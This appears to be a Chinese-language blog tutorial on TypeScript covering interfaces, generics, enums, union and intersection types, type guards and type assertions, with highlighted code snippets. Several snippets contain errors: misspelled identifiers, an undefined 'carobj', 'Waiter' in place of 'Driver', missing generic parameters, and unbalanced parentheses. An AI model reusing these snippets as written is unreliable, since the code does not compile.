<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Car &#123;</span><br><span class="line">    brand: string,</span><br><span class="line">    price?: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCarInfo</span>(<span class="params">carobj: Car</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的牌子是：<span class="subst">$&#123;carobj.brand&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span>(carobj.price)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`车的价格是：<span class="subst">$&#123;carobj.price&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">brand</span>: <span class="string">&#x27;大众&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span>&#125;;</span><br><span class="line">showCarInfo(obj);  </span><br></pre></td></tr></table></figure>

<h6 id="只读属性"><a href="#只读属性" class="headerlink" title="只读属性"></a>只读属性</h6><p>一些对象属性只能在对象刚刚创建的时候修改其值，可以在属性名前面使用<code>readonly</code>来指定其为只读属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Car &#123;</span><br><span class="line">    readonly brand: string,</span><br><span class="line">    readonly price: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> car1: Car = &#123; <span class="attr">brand</span>: <span class="string">&#x27;大众&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span>&#125;;</span><br><span class="line">car1.brand = <span class="string">&#x27;思域&#x27;</span>; <span class="comment">//报错</span></span><br></pre></td></tr></table></figure>

<h6 id="字符串索引签名"><a href="#字符串索引签名" class="headerlink" title="字符串索引签名"></a>字符串索引签名</h6><p>如果传进来的数据里面存在额外未声明的属性，也会存在问题，如果想让其绕过检查，则需要为接口添加索引签名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Car &#123;</span><br><span class="line">    brand: string,</span><br><span class="line">    price: number</span><br><span class="line">    [propName: string]: any</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCarInfo</span>(<span class="params">carobj: Car</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的牌子是：<span class="subst">$&#123;carobj.brand&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的价格是：<span class="subst">$&#123;carobj.price&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">brand</span>: <span class="string">&#x27;大众&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span>, <span class="attr">testa</span>: <span class="number">1</span>, <span class="attr">testb</span>:<span class="string">&#x27;12&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">showCarInfo(obj);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="索引签名"><a href="#索引签名" class="headerlink" title="索引签名"></a>索引签名</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface CarArr &#123;</span><br><span class="line">  [index: number]: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myArray: CarArr</span><br><span class="line"></span><br><span class="line">myArray = [<span class="string">&quot;奥迪&quot;</span>, <span class="string">&quot;大众&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myStr: string = myArray[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>

<p>索引签名是只读的</p>
<h6 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h6><p>使用接口表示函数类型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface CarFunc &#123;</span><br><span class="line">    (brand: string, <span class="attr">price</span>: number): <span class="keyword">void</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">let</span> showCarInfo: CarFunc;</span><br><span class="line">showCarInfo = <span class="function"><span class="keyword">function</span>(<span class="params">brand: string,price: number</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的牌子是：<span class="subst">$&#123;carobj.brand&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的价格是：<span class="subst">$&#123;carobj.price&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="类类型"><a href="#类类型" class="headerlink" title="类类型"></a>类类型</h6><p>使用接口强制一个类去符合相应的规则</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface ClockInterface &#123;</span><br><span class="line">    currentTime: <span class="built_in">Date</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clock</span> <span class="title">implements</span> <span class="title">ClockInterface</span> </span>&#123;</span><br><span class="line">    currentTime: <span class="built_in">Date</span>;</span><br><span class="line">	constuctor(h: number, <span class="attr">m</span>: number)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以在接口中描述一个方法，在类里面实现它</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface ClockInterface &#123;</span><br><span class="line">    currentTime: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clock</span> <span class="title">implements</span> <span class="title">ClockInterface</span> </span>&#123;</span><br><span class="line">    currentTime: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.currentTime = d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">constructor</span>(h: number, m: number) &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="接口继承"><a href="#接口继承" class="headerlink" title="接口继承"></a>接口继承</h6><p>和类一样，接口也是可以相互继承的，我们能够从一个接口复制成员到另外一个接口，可以更灵活地将接口分割到可重用的模块里</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Shape &#123;</span><br><span class="line">    color: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Square <span class="keyword">extends</span> Shape &#123;</span><br><span class="line">    sideLength: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> square = <span class="xml"><span class="tag">&lt;<span class="name">Square</span>&gt;</span>&#123;&#125;;</span></span><br><span class="line"><span class="xml">square.color = &#x27;blue&#x27;;</span></span><br><span class="line"><span class="xml">suqare.sideLength = 10;</span></span><br></pre></td></tr></table></figure>

<p>一个接口可以继承多个接口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Shape &#123;</span><br><span class="line">    color: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface PenStroke &#123;</span><br><span class="line">    penWidth: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Square <span class="keyword">extends</span> Shape, PenStroke &#123;</span><br><span class="line">    sideLength: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> square = <span class="xml"><span class="tag">&lt;<span class="name">Square</span>&gt;</span>&#123;&#125;;</span></span><br><span class="line"><span class="xml">square.color = &quot;blue&quot;;</span></span><br><span class="line"><span class="xml">square.sideLength = 10;</span></span><br><span class="line"><span class="xml">square.penWidth = 5.0;</span></span><br></pre></td></tr></table></figure>

<h6 id="混合类型"><a href="#混合类型" class="headerlink" title="混合类型"></a>混合类型</h6><p>如果一个对象可以同时做为函数和对象使用，使用接口可以如下进行定义</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Counter &#123;</span><br><span class="line">    (start: number): string;</span><br><span class="line">    interval: number;</span><br><span class="line">    reset(): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCounter</span>(<span class="params"></span>): <span class="title">Counter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> counter = <span class="xml"><span class="tag">&lt;<span class="name">Counter</span>&gt;</span>function (start: number) &#123; &#125;;</span></span><br><span class="line"><span class="xml">    counter.interval = 123;</span></span><br><span class="line"><span class="xml">    counter.reset = function () &#123; &#125;;</span></span><br><span class="line"><span class="xml">    return counter;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">let c = getCounter();</span></span><br><span class="line"><span class="xml">c(10);</span></span><br><span class="line"><span class="xml">c.reset();</span></span><br><span class="line"><span class="xml">c.interval = 5.0;</span></span><br></pre></td></tr></table></figure>

<h6 id="接口继承类"><a href="#接口继承类" class="headerlink" title="接口继承类"></a>接口继承类</h6><blockquote>
<p>当接口继承了一个类类型时，它会继承类的成员但不包括其实现。 就好像接口声明了所有类中存在的成员，但并没有提供具体实现一样。 接口同样会继承到类的private和protected成员。 这意味着当你创建了一个接口继承了一个拥有私有或受保护的成员的类时，这个接口类型只能被这个类或其子类所实现（implement）</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    private state: any;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface SelectableControl <span class="keyword">extends</span> Control &#123;</span><br><span class="line">    select(): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span> <span class="keyword">extends</span> <span class="title">Control</span> <span class="title">implements</span> <span class="title">SelectableControl</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TextBox</span> <span class="keyword">extends</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误：“Image”类型缺少“state”属性。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Image</span> <span class="title">implements</span> <span class="title">SelectableControl</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Location</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>SelectableControl</code>包含了<code>Control</code>的所有成员，包括其私有成员<code>state</code>，因为<code>state</code>是私有成员，所以只能够是<code>Control</code>的子类们才能实现<code>SelectabControl</code>接口，因为只有<code>Control</code>的子类才能够拥有一个声明于<code>Control</code>的私有成员<code>state</code>，这对私有成员的兼容性是必需的。</p>
<p>在<code>Control</code>类内部，是允许通过<code>SelectableControl</code>的实例来访问私有成员<code>state</code>的。 实际上， <code>SelectableControl</code>接口和拥有<code>select</code>方法的<code>Control</code>类是一样的。 <code>Button</code>和<code>TextBox</code>类是<code>SelectableControl</code>的子类（因为它们都继承自<code>Control</code>并有<code>select</code>方法），但<code>Image</code>和<code>Location</code>类并不是这样的。</p>
<h5 id="3、泛型"><a href="#3、泛型" class="headerlink" title="3、泛型"></a>3、泛型</h5><p>使用<code>泛型</code>来创建可重用的组件，一个组件可以支持多种类型的数据，这样用户就可以以自己的数据类型来使用组件</p>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getResult</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg1: T, arg2: T</span>):<span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg1 + arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getResult&lt;string&gt;(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>));	<span class="comment">// &#x27;12&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(getResult&lt;number&gt;(<span class="number">1</span>,<span class="number">2</span>));	<span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<h6 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface GenericIdentityFn &#123;</span><br><span class="line">    &lt;T&gt;(arg: T): T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myIdentity: GenericIdentityFn = identity;</span><br></pre></td></tr></table></figure>

<h6 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericNumber</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    zeroValue: T;</span><br><span class="line">    add: <span class="function">(<span class="params">x: T, y: T</span>) =&gt;</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myGenericNumber = <span class="keyword">new</span> GenericNumber&lt;number&gt;();</span><br><span class="line">myGenericNumber.zeroValue = <span class="number">0</span>;</span><br><span class="line">myGenericNumber.add = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; <span class="keyword">return</span> x + y; &#125;;</span><br></pre></td></tr></table></figure>

<p>注意：类有两部分：静态部分和实例部分。 泛型类指的是实例部分的类型，所以类的静态属性不能使用这个泛型类型</p>
<h6 id="泛型约束"><a href="#泛型约束" class="headerlink" title="泛型约束"></a>泛型约束</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Lengthwise &#123;</span><br><span class="line">    length: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loggingIdentity</span>&lt;<span class="title">T</span> <span class="title">extends</span> <span class="title">Lengthwise</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arg.length);  <span class="comment">// Now we know it has a .length property, so no more error</span></span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loggingIdentity(<span class="number">3</span>);  <span class="comment">// Error, number doesn&#x27;t have a .length property</span></span><br><span class="line">loggingIdentity(&#123;<span class="attr">length</span>: <span class="number">10</span>, <span class="attr">value</span>: <span class="number">3</span>&#125;);</span><br></pre></td></tr></table></figure>

<h6 id="在泛型约束中使用类型参数"><a href="#在泛型约束中使用类型参数" class="headerlink" title="在泛型约束中使用类型参数"></a>在泛型约束中使用类型参数</h6><p>你可以声明一个类型参数，且它被另一个类型参数所约束。 比如，现在想要用属性名从对象里获取这个属性。 并且想要确保这个属性存在于对象 <code>obj</code>上，因此需要在这两个类型之间使用约束</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getProperty</span>(<span class="params">obj: T, key: K</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj[key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> x = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>, <span class="attr">d</span>: <span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line">getProperty(x, <span class="string">&quot;a&quot;</span>); <span class="comment">// okay</span></span><br><span class="line">getProperty(x, <span class="string">&quot;m&quot;</span>); <span class="comment">// error: Argument of type &#x27;m&#x27; isn&#x27;t assignable to &#x27;a&#x27; | &#x27;b&#x27; | &#x27;c&#x27; | &#x27;d&#x27;.</span></span><br></pre></td></tr></table></figure>

<h6 id="在泛型里使用类类型"><a href="#在泛型里使用类类型" class="headerlink" title="在泛型里使用类类型"></a>在泛型里使用类类型</h6><p>在TypeScript使用泛型创建工厂函数时，需要引用构造函数的类类型。比如，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create</span>&lt;<span class="title">T</span>&gt;(<span class="params">c: &#123;new(): T; &#125;</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> c();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用原型属性推断并约束构造函数与类实例的关系</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BeeKeeper</span> </span>&#123;</span><br><span class="line">    hasMask: boolean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZooKeeper</span> </span>&#123;</span><br><span class="line">    nametag: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    numLegs: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bee</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    keeper: BeeKeeper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    keeper: ZooKeeper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createInstance</span>&lt;<span class="title">A</span> <span class="title">extends</span> <span class="title">Animal</span>&gt;(<span class="params">c: new () =&gt; A</span>): <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> c();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">createInstance(Lion).keeper.nametag;  <span class="comment">// typechecks!</span></span><br><span class="line">createInstance(Bee).keeper.hasMask;   <span class="comment">// typechecks!</span></span><br></pre></td></tr></table></figure>

<h5 id="4、枚举"><a href="#4、枚举" class="headerlink" title="4、枚举"></a>4、枚举</h5><p>使用枚举可以定义一些语义化的常量，清晰的表达意图。</p>
<h6 id="数字枚举"><a href="#数字枚举" class="headerlink" title="数字枚举"></a>数字枚举</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Direction &#123;</span><br><span class="line">    Up = <span class="number">1</span>,</span><br><span class="line">    Down,</span><br><span class="line">    Left,</span><br><span class="line">    Right</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Up)	<span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Down)	<span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Left)	<span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Right)	<span class="comment">// 4</span></span><br></pre></td></tr></table></figure>

<p><code>Up</code>初始化为<code>1</code>，其余的成员就会从<code>1</code>开始自动增长。</p>
<p>如果不手动初始化，则枚举值默认从<code>0</code>开始。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Direction &#123;</span><br><span class="line">    Up,</span><br><span class="line">    Down,</span><br><span class="line">    Left,</span><br><span class="line">    Right</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Up)	<span class="comment">// 0</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Down)	<span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Left)	<span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Right) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<h6 id="字符串枚举"><a href="#字符串枚举" class="headerlink" title="字符串枚举"></a>字符串枚举</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Direction &#123;</span><br><span class="line">    Up = <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">    Down = <span class="string">&quot;DOWN&quot;</span>,</span><br><span class="line">    Left = <span class="string">&quot;LEFT&quot;</span>,</span><br><span class="line">    Right = <span class="string">&quot;RIGHT&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="异构枚举"><a href="#异构枚举" class="headerlink" title="异构枚举"></a>异构枚举</h6><p>枚举可以混合字符串和数字成员，但是不推荐这么做</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum BooleanLikeHeterogeneousEnum &#123;</span><br><span class="line">    No = <span class="number">0</span>,</span><br><span class="line">    Yes = <span class="string">&quot;YES&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="5、高级类型"><a href="#5、高级类型" class="headerlink" title="5、高级类型"></a>5、高级类型</h5><h6 id="交叉类型"><a href="#交叉类型" class="headerlink" title="交叉类型"></a>交叉类型</h6><p>交叉类型是将多个类型合并为一个类型， 例如， <code>Person &amp; Serializable &amp; Loggable</code>同时是 <code>Person</code> <em>和</em> <code>Serializable</code> <em>和</em> <code>Loggable</code>。 就是说这个类型的对象同时拥有了这三种类型的成员。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extend</span>&lt;<span class="title">T</span>, <span class="title">U</span>&gt;(<span class="params">first: T, second: U</span>): <span class="title">T</span> &amp; <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="xml"><span class="tag">&lt;<span class="name">T</span> &amp; <span class="attr">U</span>&gt;</span>&#123;&#125;;</span></span><br><span class="line"><span class="xml">    for (let id in first) &#123;</span></span><br><span class="line">        (&lt;any&gt;result)[id] = (&lt;any&gt;first)[id];</span><br><span class="line">    &#125;</span><br><span class="line">    for (let id in second) &#123;</span><br><span class="line">        if (!result.hasOwnProperty(id)) &#123;</span><br><span class="line">            (&lt;any&gt;result)[id] = (&lt;any&gt;second)[id];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Person &#123;</span><br><span class="line">    constructor(public name: string) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line">interface Loggable &#123;</span><br><span class="line">    log(): void;</span><br><span class="line">&#125;</span><br><span class="line">class ConsoleLogger implements Loggable &#123;</span><br><span class="line">    log() &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var jim = extend(new Person(&quot;Jim&quot;), new ConsoleLogger());</span><br><span class="line">var n = jim.name;</span><br><span class="line">jim.log();</span><br></pre></td></tr></table></figure>

<h6 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h6><p>表示或的意思，可以是联合类型中的任意一种类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">arg: string | number</span>) </span>&#123;<span class="comment">// 使用联合类型，传入的参数既可以是字符串也可以是number</span></span><br><span class="line">    <span class="built_in">console</span>.log(arg)</span><br><span class="line">&#125;</span><br><span class="line">showInfo(<span class="string">&#x27;test&#x27;</span>);	<span class="comment">// √</span></span><br><span class="line">showInfo(<span class="number">10</span>);		<span class="comment">// √</span></span><br></pre></td></tr></table></figure>

<h6 id="类型保护"><a href="#类型保护" class="headerlink" title="类型保护"></a>类型保护</h6><p><code>typeof</code>类型保护</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">padLeft</span>(<span class="params">value: string, padding: string | number</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> padding === <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>(padding + <span class="number">1</span>).join(<span class="string">&quot; &quot;</span>) + value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> padding === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> padding + value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`Expected string or number, got &#x27;<span class="subst">$&#123;padding&#125;</span>&#x27;.`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>in</code>类型保护</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Driver &#123;</span><br><span class="line">  drive: <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Teacher &#123;</span><br><span class="line">  teach: <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judgeCareer</span>(<span class="params">careerObj: Waiter | Teacher</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&quot;teach&quot;</span> <span class="keyword">in</span> careerObj) &#123;</span><br><span class="line">    careerObj.teach();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    careerObj.drive();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>instanceof</code>类型保护</p>
<blockquote>
<p><em><code>instanceof</code>类型保护</em>是通过构造函数来细化类型的一种方式</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Padder &#123;</span><br><span class="line">    getPaddingString(): string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpaceRepeatingPadder</span> <span class="title">implements</span> <span class="title">Padder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(private numSpaces: number) &#123; &#125;</span><br><span class="line">    getPaddingString() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.numSpaces + <span class="number">1</span>).join(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringPadder</span> <span class="title">implements</span> <span class="title">Padder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(private value: string) &#123; &#125;</span><br><span class="line">    getPaddingString() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomPadder</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.random() &lt; <span class="number">0.5</span> ?</span><br><span class="line">        <span class="keyword">new</span> SpaceRepeatingPadder(<span class="number">4</span>) :</span><br><span class="line">        <span class="keyword">new</span> StringPadder(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型为SpaceRepeatingPadder | StringPadder</span></span><br><span class="line"><span class="keyword">let</span> padder: Padder = getRandomPadder();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (padder <span class="keyword">instanceof</span> SpaceRepeatingPadder) &#123;</span><br><span class="line">    padder; <span class="comment">// 类型细化为&#x27;SpaceRepeatingPadder&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (padder <span class="keyword">instanceof</span> StringPadder) &#123;</span><br><span class="line">    padder; <span class="comment">// 类型细化为&#x27;StringPadder&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h6><p>使用<code>值 as type</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMsg</span>(<span class="params">obj: string | number</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log((obj <span class="keyword">as</span> string).substr(<span class="number">1</span>));</span><br><span class="line">    <span class="built_in">console</span>.log((obj <span class="keyword">as</span> number).toFixed(<span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>&lt;type&gt;值</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMsg</span>(<span class="params">obj: string | number</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log((<span class="xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>obj).substr(1));</span></span><br><span class="line">    console.log(&lt;number&gt;obj).toFixed(2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h6><p>类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。起别名不会新建一个类型，它创建了一个新名字来引用那个类型</p>
